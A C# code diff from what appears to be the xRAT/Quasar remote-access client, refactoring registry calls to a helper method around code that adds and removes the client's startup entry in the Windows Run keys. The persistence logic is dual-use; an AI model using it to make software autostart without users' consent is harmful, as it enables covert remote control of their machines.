@@ -12,6 +12,7 @@ using Microsoft.Win32;
 using xClient.Config;
 using xClient.Core.Information;
 using xClient.Core.Encryption;
+using xClient.Core.Extensions;
 
 namespace xClient.Core
 {
@@ -414,8 +415,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                                Registry.LocalMachine.OpenWritableSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key == null) throw new Exception();
                             key.SetValue(Settings.STARTUPKEY, InstallPath);
@@ -428,8 +428,8 @@ namespace xClient.Core
                         {
                             using (
                                 RegistryKey key =
-                                    Registry.CurrentUser.OpenSubKey(
-                                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                                    Registry.CurrentUser.OpenWritableSubKey(
+                                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                             {
                                 if (key == null) throw new Exception();
                                 key.SetValue(Settings.STARTUPKEY, InstallPath);
@@ -447,8 +447,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                                Registry.CurrentUser.OpenWritableSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key == null) throw new Exception();
                             key.SetValue(Settings.STARTUPKEY, InstallPath);
@@ -589,8 +588,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                                Registry.LocalMachine.OpenWritableSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key != null)
                             {
@@ -604,8 +602,7 @@ namespace xClient.Core
                         // try deleting from Registry.CurrentUser
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                                Registry.CurrentUser.OpenWritableSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key != null)
                             {
@@ -621,8 +618,7 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                    true))
+                                Registry.CurrentUser.OpenWritableSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                         {
                             if (key != null)
                             {
